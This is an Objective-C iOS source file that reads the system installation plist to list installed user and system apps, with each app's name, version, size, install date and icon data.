//
//  InstalledAppHelper.m
//  ApplicationManager
//
//  Created by Benjawan Tanarattanakorn on 7/11/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "InstalledAppHelper.h"
#import "InstalledApplication.h"
#import "DateTimeFormat.h"
#import "MediaTypeEnum.h"
#import "SystemUtilsImpl.h"

static NSString* const kApplicationPlistPath= @"/User/Library/Caches/com.apple.mobile.installation.plist"; 


@interface InstalledAppHelper (private)
+ (InstalledApplication *)	createInstalledApplicationObjectFromAppInfo: (NSDictionary *) aAppInfo 
															  appOwner: (ApplicationOwner) aOwner;													
+ (NSString *)				getIconNameFromPlist: (NSDictionary *) aAppInfo;
+ (NSArray *)				getIconNamesFromPlist: (NSDictionary *) aAppInfo;
+ (BOOL)					isPNGExist: (NSString *) aFilename;
+ (NSString *)				addPNGIfNotExist: (NSString *) aFilename;
@end


@implementation InstalledAppHelper


+ (NSArray *) createInstalledApplicationArray {	
	DLog(@"Create installed application list from plist");
	//NSMutableDictionary *plistContent = [NSMutableDictionary dictionaryWithContentsOfFile:kApplicationPlistPath];
	NSMutableDictionary *plistContent = [[NSMutableDictionary alloc] initWithContentsOfFile:kApplicationPlistPath];
	
	//NSDictionary *userInstalledApp = [plistContent objectForKey:@"User"];
	//NSDictionary *systemInstalledApp = [plistContent objectForKey:@"System"];
	NSDictionary *userInstalledApp = [[NSDictionary alloc] initWithDictionary:[plistContent objectForKey:@"User"]];
	NSDictionary *systemInstalledApp =  [[NSDictionary alloc] initWithDictionary:[plistContent objectForKey:@"System"]];
	
	[plistContent release];
	plistContent = nil;
	
	//DLog(@"userInstalledApp: %@", userInstalledApp);
	//DLog(@"systemInstalledApp: %@", systemInstalledApp);
	
	NSMutableArray *applicationArray = [NSMutableArray array];
	
	NSBundle* bundle = [NSBundle mainBundle];
	NSString* bundleID = [bundle bundleIdentifier];
	
	// -- User application
	for (NSString* appKey in [userInstalledApp allKeys]) {	
		NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];
		
		NSDictionary *appInfo = [userInstalledApp objectForKey:appKey];
		
		NSString *bundleIdentifier = [appInfo objectForKey:@"CFBundleIdentifier"];
		if (![bundleID isEqualToString:bundleIdentifier]) {
			InstalledApplication *installedApp = [InstalledAppHelper createInstalledApplicationObjectFromAppInfo:appInfo 
																										appOwner:kApplicationOwnerUser];
			[applicationArray addObject:installedApp];
		}
		
		[pool1 drain];
	}
	
	[userInstalledApp release];
	userInstalledApp = nil;
	
	// -- System application
	for (NSString* appKey in [systemInstalledApp allKeys]) {
		NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
		NSDictionary *appInfo = [systemInstalledApp objectForKey:appKey];
		
		NSString *bundleIdentifier = [appInfo objectForKey:@"CFBundleIdentifier"];
		if (![bundleID isEqualToString:bundleIdentifier]) {
			InstalledApplication *installedApp = [InstalledAppHelper createInstalledApplicationObjectFromAppInfo:appInfo
																										appOwner:kApplicationOwnerSystem];
			
			[applicationArray addObject:installedApp];
		}
		
		[pool2 drain];
	}
	
	[systemInstalledApp release];
	systemInstalledApp = nil;
	
	DLog(@"app array: %@", applicationArray);	
	
	return [NSArray arrayWithArray:applicationArray];
}

+ (InstalledApplication *)	createInstalledApplicationObjectFromAppInfo: (NSDictionary *) aAppInfo 
															  appOwner: (ApplicationOwner) aOwner {
	NSString *applicationName = [InstalledAppHelper getAppName:aAppInfo];		
	
	// obsolete -- application name = [applicationName + CFBundleExecutable]
	//applicationName = [NSString stringWithFormat:@"[%@,%@]", applicationName, [aAppInfo objectForKey:@"CFBundleExecutable"]];
	
	InstalledApplication *installedApp = [[InstalledApplication alloc] init];
	[installedApp setMID:[aAppInfo objectForKey:@"CFBundleIdentifier"]];								// 1) set id
	
	if (![SystemUtilsImpl isIphone]							&& 			// It's ipad or ipod															
		[applicationName isEqualToString:@"MobilePhone"]	){			// It's Phone Application
			applicationName = @"FaceTime";								// Rename it to FaceTime
	}
	[installedApp setMName:applicationName];															// 2) set name	
	
	[installedApp setMVersion:[InstalledAppHelper getAppVersion:aAppInfo]];								// 3) set version
	DLog (@"Get application size and installation date ---------")
	if (aOwner == kApplicationOwnerUser) {																// 4) set size
		 [installedApp setMSize:[InstalledAppHelper getAppSize: [aAppInfo objectForKey:@"Container"]]];			// path /var/mobile/Applications/xxxxxx/*.app
		 [installedApp setMInstalledDate:[InstalledAppHelper getInstalledDate:[aAppInfo objectForKey:@"Container"]]];
	} else if (aOwner == kApplicationOwnerSystem) {
		 [installedApp setMSize:[InstalledAppHelper getAppSize: [aAppInfo objectForKey:@"Path"]]];				// path /Applications/*.app
		[installedApp setMInstalledDate:[InstalledAppHelper getInstalledDate:[aAppInfo objectForKey:@"Path"]]];
	}
	DLog (@"Get application icon image data ------------")
	
	// ----- auto release pool ------
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];		
	
	NSData *imageData = [InstalledAppHelper getIconImageData2:aAppInfo];
	[installedApp setMIcon:imageData];
	if (imageData) {
		[installedApp setMIconType:PNG];
	} else {
		[installedApp setMIconType:UNKNOWN_MEDIA];
	}
	
	[pool drain];
	// ----- end auto release pool -------
	
	DLog (@"Finished get installed application for owner = %d, installedApp = %@ -------------", aOwner, installedApp);
	return [installedApp autorelease];
}

+ (NSString *) getAppName: (NSDictionary *) aAppInfo {
	NSString *applicationName = nil;
	
	if ([aAppInfo objectForKey:@"CFBundleDisplayName"])
		applicationName = [aAppInfo objectForKey:@"CFBundleDisplayName"];
	else if ([aAppInfo objectForKey:@"CFBundleName"])
		applicationName = [aAppInfo objectForKey:@"CFBundleName"];
	else if ([aAppInfo objectForKey:@"CFBundleExecutable"])
		applicationName = [aAppInfo objectForKey:@"CFBundleExecutable"];
	DLog (@"Get application name from application info---------");
	return applicationName;
}

+ (NSString *) getAppVersion: (NSDictionary *) aAppInfo {
	NSString *version = nil;
	
	if ([aAppInfo objectForKey:@"CFBundleShortVersionString"])
		version = [aAppInfo objectForKey:@"CFBundleShortVersionString"];
	else if ([aAppInfo objectForKey:@"CFBundleVersion"])
		version = [aAppInfo objectForKey:@"CFBundleVersion"];
	DLog (@"Get application version from application info, version = %@", version);
	return version;
}
	 
+ (unsigned long long int) folderSize: (NSString *) folderPath {
	DLog (@"Get application folder size from application folder path = %@", folderPath);
	NSFileManager *fileManager = [NSFileManager defaultManager];
	
	// Performs a deep enumeration of the specified directory and returns the paths of all of the contained subdirectories.
    NSArray *filesArray = [fileManager subpathsOfDirectoryAtPath:folderPath error:nil];  
	
    NSEnumerator *filesEnumerator = [filesArray objectEnumerator];
    NSString *fileName = nil;
    unsigned long long int fileSize = 0;
	
    while (fileName = [filesEnumerator nextObject]) {		// Accumulate the size of all the sub paths
		
		NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
		
        NSDictionary *fileDictionary = [fileManager attributesOfItemAtPath:[folderPath stringByAppendingPathComponent:fileName] error:nil];
		//DLog (@"file name/size: %@: %d", fileName, [fileDictionary fileSize])
        fileSize += [fileDictionary fileSize];
		
		[pool drain];
    }
	
	// Add the size of the application folder itself
	NSDictionary *fileDictionary = [fileManager attributesOfItemAtPath:folderPath 
																 error:nil];
	//DLog (@"file name/size: %@: %d", folderPath, [fileDictionary fileSize])
    fileSize += [fileDictionary fileSize];
    return fileSize;
}

+ (NSInteger) getAppSize: (NSString *) aAppPath {
	DLog (@"Get application size from application path = %@", aAppPath);
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSInteger folderSizeInt = 0;
	if ([fileManager fileExistsAtPath:aAppPath]) {
		NSNumber *folderSizeNum = [NSNumber numberWithUnsignedLongLong:[InstalledAppHelper folderSize:aAppPath]];
		folderSizeInt = [folderSizeNum intValue];
	} 
	return folderSizeInt;
}
				   
+ (NSString *)	getInstalledDate: (NSString *) aAppPath {
	DLog (@"Get installation date from installation path = %@", aAppPath);
	NSFileManager *fileManager = [NSFileManager defaultManager];
	
	// Initialize the installed date to be now first "YYYY-MM-DD HH:mm:ss" (H is 0-23) to prevent the case that the modification date cannot be retrieved
	NSString *installedDate = [NSString stringWithString:[DateTimeFormat phoenixDateTime]];		
	
	if ([fileManager fileExistsAtPath:aAppPath]) {
		NSError *attributesRetrievalError = nil;
		NSDictionary *attributes = [fileManager attributesOfItemAtPath:aAppPath error:&attributesRetrievalError];	
		if (attributes) {
			NSDate *modificationDate = [attributes fileModificationDate];
			installedDate = [DateTimeFormat dateTimeWithDate:modificationDate];
		} else {
			DLog(@"Error for file at %@: %@", aAppPath, attributesRetrievalError);
		}		 
	} else {
		DLog (@"The application path doesn't exist: %@", aAppPath)
	}
	return installedDate;
}

+ (NSData *) getIconImageData: (NSDictionary *) aAppInfo {
	DLog (@"Get application icon image data from application info begin----------------");
	NSString *iconFilename = nil;
	NSString *iconPath = nil;
	
	// -- Find icon name from plist
	iconFilename = [InstalledAppHelper getIconNameFromPlist:aAppInfo];
	
	DLog (@"------------------------------------------------------------------------------------")
	DLog (@"icon name from plist (%@): %@", [aAppInfo objectForKey:@"CFBundleExecutable"], iconFilename)

	// -- Search default icon name in the case that not fond icon name in previous step
	if (!iconFilename || [iconFilename length] == 0) {
		NSArray *defaultIconArray = [NSArray arrayWithObjects:
									 @"Icon.png", 
									 @"icon.png",
									 @"icon@2x.png", 
									 @"Icon@2x.png", 
									 @"icon~iphone.png",
									 @"icon@2x~iphone.png", 
									 @"Camera~iphone.png",
									 @"Camera@2x~iphone.png",		// for Camera application
									 @"Photos@2x~iphone.png",		// for MobileSlideshow application
									 nil];
		for (NSString *defaultIcon in defaultIconArray) {
			iconPath =  [aAppInfo objectForKey:@"Path"];
			iconPath = [iconPath stringByAppendingPathComponent:defaultIcon];		
	
			// search icon file
			if ([[NSFileManager defaultManager] fileExistsAtPath:iconPath]) {
				DLog (@"icon path %@", iconPath)
				break;
			} else {
				//DLog (@"no path: %@", iconPath)
			}
		}
	} else {
		iconPath = [aAppInfo objectForKey:@"Path"];
		iconPath = [iconPath stringByAppendingPathComponent:iconFilename]; 
	}
	
	iconPath = [InstalledAppHelper addPNGIfNotExist:iconPath];

	//UIImage *image = [UIImage imageWithContentsOfFile:iconPath];
	UIImage *image = [[UIImage alloc] initWithContentsOfFile:iconPath];
	
	NSData *imageData = nil;
	if (image) {
		imageData = UIImagePNGRepresentation(image);
		[image release];
		image = nil;
		//DLog (@"Get image data as = %@", imageData);
		
		// For testing the image data
//		[imageData writeToFile:[InstalledAppHelper getOutputPath] atomically:NO];
	} else {
		DLog(@"can not get image");
	}
	DLog (@"icon size: %d", [imageData length])
	DLog (@"------------------------------------------------------------------------------------")	
	
	return imageData;
}

+ (NSData *) getIconImageData2: (NSDictionary *) aAppInfo {
	DLog (@"Get application icon image data from application info begin ----------------");
	//DLog (@"aAppInfo %@", aAppInfo)
	NSArray *iconFileNameArray = [self getIconNamesFromPlist:aAppInfo];
	NSString *iconPath = nil;
	
	// -- Append the default icons
	// source: http://developer.apple.com/library/ios/#qa/qa1686/_index.html
	/*
	 source: http://developer.apple.com/library/ios/#documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/App-RelatedResources/App-RelatedResources.html#//apple_ref/doc/uid/TP40007072-CH6-SW1
	Icon.png. The name for the app icon on iPhone or iPod touch.
	Icon-72.png. The name for the app icon on iPad.
	Icon-Small.png. The name for the search results icon on iPhone and iPod touch. This file is also used for the Settings icon on all devices.
	Icon-Small-50.png. The name of the search results icon on iPad.
	 */
	NSArray *defaultIconArray = [NSArray arrayWithObjects:
								 @"Icon@2x.png",				// -- Home screen for iPhone 4 High Resolution
								 @"icon@2x.png",				// -- Home screen for iPhone 4 High Resolution
								 
								 @"Icon.png",					// -- App Store and Home screen on iPhone/iPod touch
								 @"icon.png",					// -- App Store and Home screen on iPhone/iPod touch								 

								 @"Icon-72.png.",				// -- Home screen for iPad compatibility ---- App Store and Home screen on iPad
								 @"icon-72.png.",				// -- Home screen for iPad compatibility ---- App Store and Home screen on iPad
								 
								 @"icon~iphone.png",
								 @"icon@2x~iphone.png", 
								 @"icon@2x~ipad.png",			// found on Setting, MobileTimer, MobileMusic on iPad

								 // -- Camera Application --
								 @"Camera~iphone.png",
								 @"Camera@2x~iphone.png",			// for Camera application on iPhone
								 @"Camera@2x~ipad.png",				// for Camera application on iPad
								 @"Camera-spotlight@2x~ipad.png",
								 
								 // -- FaceTime on iPad
								 @"Icon-FaceTime@2x~ipad.png",			// for Phone application on iPad
								 @"Icon-FaceTime~ipad.png",
								 @"Icon-FaceTime-Small@2x~ipad.png",	// for Phone application on iPad
								 @"Icon-FaceTime-Small~ipad.png",
								 
								 // -- FaceTime on iPhone
								 @"Icon-FaceTime@2x.png", 
								 @"Icon-FaceTime.png", 
								 @"Icon-FaceTime-Small@2x.png", 
								 @"Icon-FaceTime-Small.png", 
								 
								 // -- Photo Booth on iPad
								// @"Photo Booth@2x~ipad.png",
								// @"Photo Booth-50@2x~ipad.png",
								 
								 // -- Photo Application --
								 @"Photos@2x~iphone.png",		// for MobileSlideshow application								 
								 @"Photos~iphone.png",			// for MobileSlideshow application (tested on ios 6.1)
								 
								 // Sportlight
								 @"Icon-Small@2x.png",			// -- Spotlight and Settings for iPhone 4 High Resolution  (found on iOS 6.1.2)
								 @"icon-Small@2x.png",			// -- Spotlight and Settings for iPhone 4 High Resolution
								 
								 @"Icon-Small.png",				// -- Spotlight and Settings ---- Settings on iPad
								 @"icon-Small.png",				// -- Spotlight and Settings ---- Settings on iPad								 
								 
								 @"Icon-Small-50.png",			// -- Spotlight for iPad compatibility ---- Spotlight on iPad
								 @"icon-Small-50.png",			// -- Spotlight for iPad compatibility ---- Spotlight on iPad
								 
								 @"icon-spotlight@2x~ipad.png", // found on Setting application nad MobileTimer on iPad
								 														 
								 nil];

	iconFileNameArray = [iconFileNameArray arrayByAddingObjectsFromArray:defaultIconArray];
	
	DLog (@"------------------------------------------------------------------------------------")
	//DLog (@"icon nameS from plist (%@): %@", [aAppInfo objectForKey:@"CFBundleExecutable"], iconFileNameArray)
	
	UIImage *iconImage = nil;
		
	// -- Icon filename are specified
	if ([iconFileNameArray count]) {
		// -- traverse until found the actual icon
		for (NSString *eachIconName in iconFileNameArray) {			
			iconPath = [aAppInfo objectForKey:@"Path"];								// get the path from the plist
			iconPath = [iconPath stringByAppendingPathComponent:eachIconName];		// append the icon name from
			//DLog (@"iconPath %@",iconPath)
			iconPath = [InstalledAppHelper addPNGIfNotExist:iconPath];				// 
			//DLog (@"iconPath (PNG) %@",iconPath)			
			if ([[NSFileManager defaultManager] fileExistsAtPath:iconPath]) {		// found icon file
				DLog (@"get icon from path: %@", iconPath)
				iconImage = [[UIImage alloc] initWithContentsOfFile:iconPath];
				break;																// !!! BREAK IF FOUND
			}			
		}
	}
	
	NSData *imageData = nil;
	
	if (iconImage) {
		imageData = [UIImagePNGRepresentation(iconImage) retain];
		[iconImage release];
		iconImage = nil;
		//DLog (@"Get image data as = %@", imageData);
	} else {
		DLog(@"++++++++++++++++++++++++++++		CANNOT GET ICON		+++++++++++++++++++++++++++++++");
	}

	return [imageData autorelease];
}

+ (NSString *) getIconNameFromPlist: (NSDictionary *) aAppInfo {
	NSString *iconFilename = nil;
	
	if ([aAppInfo objectForKey:@"CFBundleIconFile"])
		iconFilename = [aAppInfo objectForKey:@"CFBundleIconFile"];
	else if ([aAppInfo objectForKey:@"CFBundleIconFiles"])
		iconFilename = [[aAppInfo objectForKey:@"CFBundleIconFiles"] count] ? [[aAppInfo objectForKey:@"CFBundleIconFiles"] objectAtIndex:0] : nil;
	
	return iconFilename;
}

+ (NSArray *) getIconNamesFromPlist: (NSDictionary *) aAppInfo {
	NSString *iconFilename = nil;
	NSMutableArray *iconNameArray = [[NSMutableArray alloc] init];
	/*
	 > CFBundleIconFile: not need to include the extension (prefer the use of the “CFBundleIconFiles)
	 > CFBundleIconFiles: Omitting the filename extension lets the system automatically detect high-resolution (@2x) versions of your image files
							If present, the values in this key take precedence over the value in the “CFBundleIconFile” key.
	 > CFBundleIcons:
		>> CFBundlePrimaryIcon: Home screen and Settings app. It is a dictionary that identifies the icons associated with the app bundle
			 >>> CFBundleIconFiles: 
	*/	
				
	if ([aAppInfo objectForKey:@"CFBundleIconFiles"]) {	
		//DLog (@">> CFBundleIconFiles %@", [aAppInfo objectForKey:@"CFBundleIconFiles"])
		if ([[aAppInfo objectForKey:@"CFBundleIconFiles"] count] != 0) 
			[iconNameArray addObjectsFromArray:[aAppInfo objectForKey:@"CFBundleIconFiles"]];

	}		
	
	if ([aAppInfo objectForKey:@"CFBundleIconFile"]) {
		iconFilename = [aAppInfo objectForKey:@"CFBundleIconFile"];	
		//DLog (@">> CFBundleIconFile %@", iconFilename)
		if (iconFilename)
			[iconNameArray addObject:iconFilename];
	}
	
	if ([aAppInfo objectForKey:@"CFBundleIcons"]) {
		NSDictionary *bundleIcons = [[NSDictionary alloc] initWithDictionary:[aAppInfo objectForKey:@"CFBundleIcons"]];
		if ([bundleIcons objectForKey:@"CFBundlePrimaryIcon"]) {	
			NSDictionary *primaryIcon = [[NSDictionary alloc] initWithDictionary:[bundleIcons objectForKey:@"CFBundlePrimaryIcon"]];
			if ([primaryIcon objectForKey:@"CFBundleIconFiles"]) {
				DLog (@">> primary icon %@", [primaryIcon objectForKey:@"CFBundleIconFiles"])
				[iconNameArray addObjectsFromArray:[primaryIcon objectForKey:@"CFBundleIconFiles"]];
			}
		}		
	}	
	
	//DLog (@">>> icon from plist %@", iconNameArray)
	return [NSArray arrayWithArray:[iconNameArray autorelease]];
}


+ (BOOL) isPNGExist: (NSString *) aFilename {
	return [[aFilename lowercaseString] hasSuffix:@".png"];
}

+ (BOOL) isJPGExist: (NSString *) aFilename {
	return [[aFilename lowercaseString] hasSuffix:@".jpg"] || [[aFilename lowercaseString] hasSuffix:@".jpeg"];
}

+ (NSString *) addPNGIfNotExist: (NSString *) aFilename {
	NSString *aNewFilename = aFilename;
	if (![self isPNGExist:aFilename] && ![self isJPGExist:aFilename]) {
		aNewFilename = [aFilename stringByAppendingString:@".png"];
	}
	return aNewFilename;
}

/// !!!: for testing purpose
+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

/// !!!: for testing purpose
+ (NSString *) getOutputPath {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@image_output_%@.png",@"/tmp/appicon/", formattedDateString];
	//DLog(@"output path: %@", outputPath);
	return [outputPath autorelease];
}

@end
